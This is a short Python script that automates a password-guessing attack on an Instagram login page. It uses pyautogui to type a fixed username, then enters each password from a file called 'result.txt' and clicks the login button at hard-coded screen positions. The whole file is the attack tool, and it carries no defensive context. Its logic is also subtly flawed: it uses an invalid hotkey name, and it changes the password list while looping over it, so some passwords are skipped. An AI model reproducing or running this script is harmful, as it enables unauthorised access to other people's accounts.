import pyautogui
import time 
import webbrowser

def clear_text():
    pyautogui.hotkey('ctl', 'a')
    pyautogui.press('backspace')


webbrowser.open('https://www.instagram.com/accounts/login/')
time.sleep(10) 

pyautogui.click(1364, 315)
pyautogui.write('darknet_off1cial')
pyautogui.press('tab')

with open('result.txt', 'r') as file:
    passwords = file.readlines()

for password in passwords:
    password = password.strip()
    clear_text()
    pyautogui.write(password, interval=0.1)
    pyautogui.click(1418, 430)
    time.sleep(5)

    if passwords:
        passwords.pop(0)
        if passwords:
            password = passwords[0].strip()
            clear_text()
            pyautogui.write(password, interval=0.1)
        
        pyautogui.click(1418, 430)
    
    time.sleep(1)

print('tayyor')